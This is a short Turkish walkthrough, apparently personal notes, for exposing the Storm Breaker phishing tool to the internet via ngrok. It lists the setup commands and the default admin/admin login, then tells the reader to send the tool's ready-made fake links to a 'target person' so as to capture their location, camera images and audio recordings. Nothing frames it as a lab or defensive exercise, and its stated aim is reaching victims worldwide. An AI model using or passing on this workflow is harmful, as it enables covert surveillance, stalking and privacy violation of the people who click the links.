- 🌐 **Amaç:** Sadece yerel ağda değil, tüm dünyadaki kullanıcıları hedeflemek için **ngrok** konfigürasyonu yapılır.
    

---

### 🔑 Adımlar

1. 📝 [ngrok.com](https://ngrok.com/) → Kayıt ol ve giriş yap.
    
2. 📥 Ngrok’u indir → zip dosyasını çıkart.
    
3. 🔗 **Auth Token ekle:**
    
    ```bash
    ./ngrok config add-authtoken <sizin_tokeniniz>
    ```
    
    ✅ Bu, ngrok token’ını bilgisayarına kaydeder.
    
4. 🚀 Ngrok’u 2525 portunda çalıştır:
    
    ```bash
    ./ngrok 2525
    ```
    
5. ⚡ Storm Breaker’ı başlat:
    
    ```bash
    sudo python3 st.py
    ```
    
6. 🔐 Tarayıcıdan giriş yap:
    
    ```
    http://localhost:2525
    ```
    
    👉 Kullanıcı adı: **admin**  
    👉 Şifre: **admin**
    
7. 🌍 Ngrok panelinde “**Forwarding**” kısmındaki link → arayüze dünyanın her yerinden erişim sağlar.
    
8. 🎯 Arayüzdeki **hazır linkler** hedef kişiye gönderilir.
    
    - 🔎 Hedef linke tıkladığında:
        
        - 📍 Konum bilgisi
            
        - 📸 Kamera görüntüsü
            
        - 🎤 Ses kaydı  
            gibi bilgiler elde edilir.
            

---

💡 **Özet:**  
Ngrok = Lokaldeki servisi dünyaya açar 🌍  
Storm Breaker = Sahte linklerle hedefin cihazından bilgi toplar 🎯

---